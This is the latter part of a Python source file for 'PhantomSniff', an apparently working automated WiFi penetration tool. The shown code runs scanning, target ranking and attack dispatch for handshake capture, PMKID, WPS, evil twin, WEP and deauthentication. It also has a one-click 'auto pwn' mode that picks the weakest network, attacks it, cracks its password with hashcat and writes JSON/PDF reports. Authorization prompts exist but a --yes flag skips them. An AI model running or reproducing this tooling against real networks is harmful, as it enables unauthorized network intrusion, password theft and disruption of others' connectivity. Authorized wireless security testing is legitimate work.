        if getattr(p, "_logfh", None):
            try:
                p._logfh.close()
            except Exception:
                pass
        if p in self.procs:
            self.procs.remove(p)

    def kill_all(self):
        for p in list(self.procs):
            self.kill_proc(p)

    def new_workdir(self, tag):
        d = os.path.join(self.outdir, "attacks",
                         "{}_{}".format(time.strftime("%Y%m%d_%H%M%S"), tag))
        os.makedirs(d, exist_ok=True)
        return d

    # ------------------------------ interaction --------------------------------
    def ask(self, prompt, default=None):
        if self.args.headless:
            return default
        try:
            val = input(c(prompt, Color.CYAN)).strip()
        except EOFError:
            return default
        return val or default

    def ask_yn(self, prompt, default=True):
        if self.args.headless:
            return default
        d = "Y/n" if default else "y/N"
        val = self.ask(f"{prompt} [{d}] ", None)
        if not val:
            return default
        return val.lower().startswith("y")

    def confirm_attack(self, target_desc):
        """Authorization gate - every attack requires explicit confirmation."""
        if self.args.yes:
            return True
        if self.args.headless:
            Log.err("headless attacks require --yes (explicit authorization)")
            return False
        hline(ch="!")
        print(c("  AUTHORIZED USE ONLY: attacking networks without the owner's",
                Color.YELLOW))
        print(c("  written permission is ILLEGAL. Confirm you are authorized.",
                Color.YELLOW))
        hline(ch="!")
        try:
            val = input(c("Type 'YES' to attack " + target_desc + ": ", Color.YELLOW))
        except EOFError:
            return False
        return val.strip().upper() == "YES"

    # ------------------------------ interface mgmt --------------------------------
    def choose_interface(self):
        if self.args.interface:
            names = [a["name"] for a in InterfaceManager.list_adapters()]
            if self.args.interface not in names:
                raise PhantomError(f"interface {self.args.interface} not found "
                                   f"(wireless adapters: {names or 'none'})")
            self.orig_iface = self.args.interface
        else:
            adapters = [a for a in InterfaceManager.list_adapters() if a["name"]]
            if not adapters:
                raise PhantomError("no wireless interfaces detected")
            print(c("\nAvailable wireless adapters:", Color.WHITE))
            for i, a in enumerate(adapters):
                chip = InterfaceManager.chipset(a["name"])
                print("  [{}] {}  {}  {}  {}".format(
                    i, a["name"], a["type"] or "?", a["addr"], c(chip, Color.GRAY)))
            idx = self.ask("select adapter index: ", "0")
            try:
                self.orig_iface = adapters[int(idx)]["name"]
            except (ValueError, IndexError):
                raise PhantomError("invalid adapter selection")
        self.iface = self.orig_iface
        Log.info(f"using interface {c(self.orig_iface, Color.CYAN)} "
                 f"({InterfaceManager.chipset(self.orig_iface)})")

    def ensure_monitor(self):
        """Idempotently place self.iface in monitor mode."""
        if self.iface and InterfaceManager.get_type(self.iface) == "monitor":
            return self.iface
        if not self.orig_iface:
            self.choose_interface()
        if not self.args.skip_kill and not self.killed_mgrs and \
                InterfaceManager.get_type(self.orig_iface) != "monitor":
            InterfaceManager.kill_managers()
            self.killed_mgrs = True
        mon = InterfaceManager.enable_monitor(self.orig_iface)
        self.iface = mon
        return mon

    def ensure_managed(self):
        """Flip back to managed mode (Evil Twin AP needs a managed interface)."""
        if self.iface and InterfaceManager.get_type(self.iface) == "monitor":
            orig = InterfaceManager.disable_monitor(self.iface)
            self.iface = orig or self.orig_iface
            self.orig_iface = self.iface
        return self.iface

    # -------------------------------- flows -------------------------------------
    def do_scan(self):
        iface = self.ensure_monitor()
        Log.info(f"scanning on {iface} for {self.args.scan_time}s "
                 f"(channel {self.args.channel or 'hopping'}, band {self.args.band})...")
        nets = Scanner(self).scan(iface, self.args.scan_time,
                                  channel=self.args.channel, band=self.args.band)
        self.nets = nets
        self.report.data["interface"] = iface
        if nets:
            Scanner.print_table(nets)
            self.report.set_scan(nets)
        else:
            Log.warn("no networks found - try a longer --scan-time")
        return nets

    def choose_target(self, auto=False):
        if not self.nets:
            raise PhantomError("no scan results - run a scan first")
        ordered = sorted(self.nets.values(), key=lambda n: (-n.score(), -n.power))
        if auto or self.args.headless:
            self.last_target = ordered[0]
            Log.info(f"auto-selected best target: {ordered[0].essid} "
                     f"({ordered[0].bssid}) score={ordered[0].score()}")
            return ordered[0]
        idx = self.ask("select target index: ", "0")
        try:
            self.last_target = ordered[int(idx)]
            return self.last_target
        except (ValueError, IndexError):
            raise PhantomError("invalid target selection")

    def run_attack(self, key, net, client=None):
        cls = ATTACKS[key]
        missing = [t for t in cls.REQUIRES if not shutil.which(t)]
        if missing:
            Log.warn(f"{key}: missing tools {missing} - attack may fail")
        wd = self.new_workdir(key)
        atk = cls(self, net, wd, client=client)
        Log.info(f"=== {cls.LABEL} -> {net.essid} ({net.bssid}) ===")
        try:
            res = atk.run()
        except Exception as e:
            Log.err(f"{key} crashed: {e}")
            res = {"success": False, "type": key, "target": net.bssid,
                   "essid": safe(net.essid), "detail": f"exception: {e}",
                   "cap": None, "hash22000": None, "password": None}
        self.report.add_attack(res)
        self.last_attack = res
        status = c("SUCCESS", Color.GREEN) if res.get("success") else c("FAILED", Color.RED)
        Log.info(f"{key} result: {status} {res.get('detail', '')}")
        return res

    def find_cap_for(self, bssid):
        for p in glob.glob(os.path.join(self.outdir, "caps", "*.cap")):
            if bssid.replace(":", "").lower() in os.path.basename(p).lower():
                return p
        return None

    def find_hash_for(self, bssid):
        for p in glob.glob(os.path.join(self.outdir, "hashes", "*.22000")):
            if bssid.replace(":", "").lower() in os.path.basename(p).lower():
                return p
        return None

    def do_crack(self, net, res):
        if res.get("password"):
            self.show_password(net, res["password"], res.get("type", "attack"))
            return res
        engine = CrackEngine(self)
        r = engine.auto_crack(res.get("cap"), net.bssid, net.essid,
                              res.get("hash22000"))
        self.report.add_crack({"target": net.bssid, "essid": net.essid,
                               "method": r.get("method", ""),
                               "password": r.get("password", ""),
                               "speed": r.get("speed", ""),
                               "elapsed": round(r.get("elapsed", 0), 1)})
        if r.get("cracked") and r.get("password"):
            self.show_password(net, r["password"], r.get("method", "cracking"))
        else:
            Log.err("cracking failed - try a larger/custom wordlist or --mask")
        return r

    def show_password(self, net, pw, how):
        hline(ch="=")
        print(c(f"  TARGET  : {net.essid} ({net.bssid})", Color.GREEN))
        print(c(f"  METHOD  : {how}", Color.GREEN))
        print(c(f"  PASSWORD: {pw}", Color.GREEN))
        hline(ch="=")
        Log.ok(f"PASSWORD FOUND: {pw}")

    # -------------------------------- menus -------------------------------------
    def attack_menu(self, net):
        keys = list(ATTACKS.keys())
        print(c("\nAttack modules:", Color.WHITE))
        for i, k in enumerate(keys, 1):
            cls = ATTACKS[k]
            print(f"  [{i}] {cls.LABEL:<44} ({', '.join(cls.REQUIRES)})")
        ch = self.ask("attack> ", "1")
        try:
            key = keys[int(ch) - 1]
        except (ValueError, IndexError):
            Log.warn("invalid attack selection")
            return None
        client = None
        if key in ("handshake", "deauth") and net.clients:
            print(c("  known clients: " + ", ".join(sorted(net.clients)), Color.GRAY))
            client = (self.ask("target specific client MAC (blank = broadcast): ",
                               "") or "").strip() or None
        if not self.confirm_attack(f"{net.essid} ({net.bssid})"):
            return None
        res = self.run_attack(key, net, client)
        self.last_target = net
        if res.get("password"):
            self.show_password(net, res["password"], key)
            return res
        if res.get("cap") or res.get("hash22000"):
            if self.ask_yn("Attempt cracking now?", default=True):
                self.do_crack(net, res)
        return res

    def crack_menu(self):
        if not self.last_target:
            Log.warn("no target selected - scan and run an attack first")
            return
        res = self.last_attack or {}
        if not (res.get("cap") or res.get("hash22000")):
            Log.warn("no capture material from the last attack")
            return
        self.do_crack(self.last_target, res)

    def report_menu(self):
        rdir = os.path.join(self.outdir, "reports")
        os.makedirs(rdir, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        jp = os.path.join(rdir, f"report_{stamp}.json")
        pp = os.path.join(rdir, f"report_{stamp}.pdf")
        self.report.save_json(jp)
        self.report.save_pdf(pp)
        Log.ok(f"JSON report: {jp}")
        Log.ok(f"PDF  report: {pp}")
        return jp, pp

    def deps_menu(self):
        print(c("\nDependency status:", Color.WHITE))
        for b in DependencyManager.BINS:
            if shutil.which(b):
                print(f"  {c('[ok]', Color.GREEN)} {b}")
            else:
                print(f"  {c('[MISSING]', Color.RED)} {b}")
        sc = DependencyManager.scapy_ok()
        print(f"  {c('[ok]', Color.GREEN) if sc else c('[MISSING]', Color.RED)} "
              f"scapy (python)")
        missing = DependencyManager.missing()
        if missing and self.ask_yn(f"Auto-install {missing}?", default=True):
            DependencyManager.install(missing)
            still = DependencyManager.missing()
            Log.ok("dependency check complete" if not still
                   else f"still missing: {still}")

    def adapter_menu(self):
        print(c("\nWireless adapters:", Color.WHITE))
        for a in InterfaceManager.list_adapters():
            chip = InterfaceManager.chipset(a["name"])
            mon = "yes" if InterfaceManager.supports_monitor(a["name"]) else "unknown"
            print(f"  {a['name']:<10} phy{a['phy']} {a['type']:<10} {a['addr']}  "
                  f"chipset={chip}  monitor={mon}")

    def auto_pwn(self):
        """One-click: scan -> best target -> best attack -> crack -> report."""
        Log.info("AUTO PWN engaged")
        nets = self.do_scan()
        if not nets:
            Log.err("nothing to attack - aborting auto mode")
            return
        net = self.choose_target(auto=True)
        self.last_target = net
        if not self.confirm_attack(f"{net.essid} ({net.bssid})"):
            Log.warn("aborted by user")
            return
        res = None
        for key in Network.recommend(net):
            res = self.run_attack(key, net)
            if res.get("success"):
                break
        if res is None:
            return
        if res.get("password"):
            self.show_password(net, res["password"], res["type"])
        elif res.get("cap") or res.get("hash22000"):
            self.do_crack(net, res)
        else:
            Log.err("auto pwn could not obtain crackable material; try manual mode")
        self.report_menu()
        hline(ch="=")
        Log.info("AUTO PWN complete - reports saved (JSON + PDF)")

    def headless_attack(self):
        if not self.args.bssid:
            Log.info("no --bssid given: scanning for best target")
            nets = self.do_scan()
            if not nets:
                raise PhantomError("no networks found")
            net = self.choose_target(auto=True)
        else:
            bssid = self.args.bssid.lower()
            net = self.nets.get(bssid)
            if net is None:
                if self.args.channel:
                    net = Network(bssid=bssid,
                                  essid=self.args.essid or "<hidden>",
                                  channel=self.args.channel)
                else:
                    nets = self.do_scan()
                    net = nets.get(bssid)
                    if net is None:
                        raise PhantomError(
                            f"--bssid {bssid} not seen during scan; pass --channel "
                            "and --essid to force the attack")
        self.last_target = net
        if not self.confirm_attack(f"{net.essid} ({net.bssid})"):
            raise PhantomError("attack not authorized (--yes required in headless mode)")
        res = self.run_attack(self.args.attack, net, client=self.args.client)
        if res.get("password"):
            self.show_password(net, res["password"], self.args.attack)
        elif res.get("cap") or res.get("hash22000"):
            self.do_crack(net, res)

    def menu(self):
        while True:
            hline()
            print(c(f"  {__tool__} v{__version__}  |  interface: ", Color.MAGENTA) +
                  c(self.iface or "-", Color.CYAN) +
                  c("  |  targets: ", Color.MAGENTA) + c(str(len(self.nets)), Color.CYAN))
            hline()
            print("  [A] Auto Pwn (scan->attack->crack)      [S] Scan networks")
            print("  [T] Select target + attack              [C] Cracking engine")
            print("  [R] Export report (JSON+PDF)            [D] Dependency check/install")
            print("  [I] Adapter info                        [Q] Quit")
            ch = self.ask("phantomsniff> ", "").strip().lower()
            try:
                if ch in ("q", "quit", "0", "exit"):
                    return
                elif ch == "a":
                    self.auto_pwn()
                elif ch == "s":
                    self.do_scan()
                elif ch == "t":
                    if not self.nets:
                        self.do_scan()
                    if self.nets:
                        net = self.choose_target()
                        self.attack_menu(net)
                elif ch == "c":
                    self.crack_menu()
                elif ch == "r":
                    self.report_menu()
                elif ch == "d":
                    self.deps_menu()
                elif ch == "i":
                    self.adapter_menu()
                else:
                    Log.warn("unknown option (A/S/T/C/R/D/I/Q)")
            except PhantomError as e:
                Log.err(str(e))
            except KeyboardInterrupt:
                print()
                Log.warn("cancelled - back to menu")
                time.sleep(0.3)

    # ------------------------------ lifecycle ---------------------------------
    def preflight(self):
        if os.geteuid() != 0:
            raise PhantomError("PhantomSniff must run as root: monitor mode and raw "
                               "sockets require CAP_NET_ADMIN (use sudo).")
        for sub in ("caps", "hashes", "attacks", "wordlists", "reports", "logs", "crack"):
            os.makedirs(os.path.join(self.outdir, sub), exist_ok=True)
        missing = DependencyManager.missing()
        if missing:
            Log.warn(f"missing external tools: {missing}")
            if self.args.install_deps:
                DependencyManager.install(missing)
            elif not self.args.headless and self.ask_yn(
                    "Attempt automatic installation now?", default=True):
                DependencyManager.install(missing)
            else:
                Log.warn("continuing; attacks needing those tools will fail")
        if not DependencyManager.scapy_ok():
            Log.warn("python scapy missing - handshake verification degraded "
                     "(fix: pip3 install scapy)")

    def run(self):
        self.preflight()
        if self.args.scan_only:
            self.do_scan()
            self.report_menu()
            return
        if self.args.attack:
            self.headless_attack()
            self.report_menu()
            return
        if self.args.auto:
            self.auto_pwn()
            self.report_menu()
            return
        self.menu()
        self.report_menu()

    def cleanup(self):
        """Restore the system: kill children, restore managed mode, restart
        network managers, persist state."""
        self.kill_all()
        try:
            if self.iface and not self.args.keep_monitor and \
                    InterfaceManager.get_type(self.iface) == "monitor":
                orig = InterfaceManager.disable_monitor(self.iface)
                if orig:
                    self.iface = orig
        except Exception as e:
            Log.dbg(f"monitor restore issue: {e}")
        if self.killed_mgrs:
            try:
                InterfaceManager.restore_managers()
            except Exception:
                pass
        try:
            stamp = time.strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.outdir, "reports", f"report_{stamp}.json")
            os.makedirs(os.path.dirname(path), exist_ok=True)
            self.report.save_json(path)
            Log.info(f"state saved: {path}")
        except Exception as e:
            Log.dbg(f"report save failed: {e}")
        Log.ok("cleanup complete")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

EPILOG = """examples:
  sudo python3 phantomsniff.py                                   interactive menu
  sudo python3 phantomsniff.py --auto                            one-click auto pwn
  sudo python3 phantomsniff.py -i wlan0 --scan-only --scan-time 60
  sudo python3 phantomsniff.py --headless --auto --yes -i wlan0  unattended run
  sudo python3 phantomsniff.py -a handshake --bssid AA:BB:CC:DD:EE:FF --channel 6
  sudo python3 phantomsniff.py -a deauth --bssid AA:BB:.. --client CC:DD:..
  sudo python3 phantomsniff.py -a eviltwin --bssid AA:BB:.. --et-timeout 600
  sudo python3 phantomsniff.py -a pmkid --bssid AA:BB:.. -w wordlist.txt
  sudo python3 phantomsniff.py --install-deps                    install toolchain

legal: use only on networks you own or have WRITTEN authorization to test.
"""


def parse_args():
    p = argparse.ArgumentParser(
        prog="phantomsniff",
        description=f"{__tool__} v{__version__} - Automated WiFi Penetration "
                    "Testing Framework",
        epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sel = p.add_argument_group("target selection")
    sel.add_argument("-i", "--interface", help="wireless interface to use (e.g. wlan0)")
    sel.add_argument("--bssid", help="target AP MAC for non-interactive attacks")
    sel.add_argument("--channel", type=int, help="target AP channel (locks scanning)")
    sel.add_argument("--essid", help="target SSID when hidden (evil twin / wep)")
    sel.add_argument("--client", help="client MAC for targeted deauth")
    sel.add_argument("--scan-time", type=int, default=30,
                     help="seconds to scan (default: 30)")
    sel.add_argument("--band", default="abg", choices=["a", "b", "g", "abg"],
                     help="scan band (default: abg = 2.4 + 5 GHz)")
    atk = p.add_argument_group("attack modes")
    atk.add_argument("-a", "--attack",
                     choices=["handshake", "pmkid", "wps", "eviltwin", "wep",
                              "deauth"],
                     help="attack module to run (non-interactive)")
    atk.add_argument("--auto", action="store_true",
                     help="one-click: scan, pick best target, attack, crack")
    atk.add_argument("--scan-only", action="store_true",
                     help="scan and report, then exit")
    atk.add_argument("--deauth-count", type=int, default=5,
                     help="deauth frames per burst (default: 5)")
    atk.add_argument("--deauth-rounds", type=int, default=6,
                     help="handshake deauth attempts (default: 6)")
    atk.add_argument("--deauth-iface",
                     help="second adapter (monitor) for ongoing deauth during "
                          "evil twin")
    atk.add_argument("--hs-timeout", type=int, default=240,
                     help="handshake capture timeout seconds (default: 240)")
    atk.add_argument("--pmkid-timeout", type=int, default=90,
                     help="PMKID capture seconds (default: 90)")
    atk.add_argument("--wps-timeout", type=int, default=420,
                     help="pixie dust timeout seconds (default: 420)")
    atk.add_argument("--wep-timeout", type=int, default=900,
                     help="WEP attack timeout seconds (default: 900)")
    atk.add_argument("--et-timeout", type=int, default=300,
                     help="evil twin portal seconds (default: 300)")
    crk = p.add_argument_group("cracking")
    crk.add_argument("-w", "--wordlist",
                     help="custom wordlist path (rockyou auto-obtained if unset)")
    crk.add_argument("--rule", default="best64.rule",
                     help="hashcat rule file (default: best64.rule, '' disables)")
    crk.add_argument("--mask",
                     help="hashcat mask for brute-force, e.g. ?d?d?d?d?d?d?d?d")
    crk.add_argument("--threads", type=int, default=None,
                     help="override the CPU/RAM-derived thread pool size")
    misc = p.add_argument_group("misc")
    misc.add_argument("-o", "--output-dir", default="phantomsniff_output",
                      help="output directory (default: ./phantomsniff_output)")
    misc.add_argument("--headless", action="store_true",
                      help="CLI-only mode: no banner/menu, minimal output, max speed")
    misc.add_argument("--no-color", action="store_true", help="disable ANSI colors")
    misc.add_argument("--yes", "-y", action="store_true",
                      help="skip authorization confirmation (automation)")
    misc.add_argument("--install-deps", action="store_true",
                      help="auto-install missing system dependencies")
    misc.add_argument("--skip-kill", action="store_true",
                      help="do not kill network managers before monitor mode")
    misc.add_argument("--keep-monitor", action="store_true",
                      help="leave interface in monitor mode on exit")
    misc.add_argument("--log-file", default=None, help="custom log file path")
    misc.add_argument("--version", action="version",
                      version=f"{__tool__} {__version__}")
    return p.parse_args()


def main():
    args = parse_args()
    if args.no_color or not sys.stdout.isatty():
        Color.ENABLED = False
    os.makedirs(args.output_dir, exist_ok=True)
    log_path = args.log_file or os.path.join(
        args.output_dir, "logs", f"phantomsniff_{time.strftime('%Y%m%d_%H%M%S')}.log")
    os.makedirs(os.path.dirname(os.path.abspath(log_path)), exist_ok=True)
    Log.init(log_path, quiet=args.headless)
    if not args.headless:
        print(c(build_banner(), Color.CYAN))
        print(c(f"        v{__version__}  |  automated wifi pentest framework",
                Color.MAGENTA))
        print(c("        AUTHORIZED USE ONLY - you are responsible for your actions\n",
                Color.YELLOW))
    app = PhantomSniff(args)
    try:
        app.run()
    except PhantomError as e:
        Log.err(str(e))
        sys.exit(1)
    except KeyboardInterrupt:
        print()
        Log.warn("interrupted by user")
    finally:
        app.cleanup()


if __name__ == "__main__":
    main()
